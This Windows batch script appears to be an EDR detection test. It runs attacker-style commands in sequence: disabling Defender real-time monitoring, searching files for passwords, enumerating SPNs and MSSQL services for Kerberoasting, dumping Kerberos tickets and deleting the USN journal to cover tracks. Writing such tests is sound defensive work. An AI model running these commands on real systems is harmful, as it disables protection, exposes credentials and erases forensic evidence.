tasklist  /FO csv /svc >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
gpscript.exe /Logon >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
klist >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cmd.exe powershell Set-MpPreference -DisableRealtimeMonitoring $true >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
findstr /si password *.xml *.ini *.txt *.config 2>nul >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ECHO | nslookup | findstr "Default\ Server" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
setspn -T * -Q */*  >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
setspn -T abc.local -Q */* | findstr ":1433"  >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
dir /b /ad "C:\Users\" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
fsutil usn deletejournal /D C: >> c:\testEDR.txt
ECHO ============================
ECHO ***************************************************
ECHO Test already Finishied  ! Happy hunting threats :)
ECHO ***************************************************
ECHO ============================
PAUSE
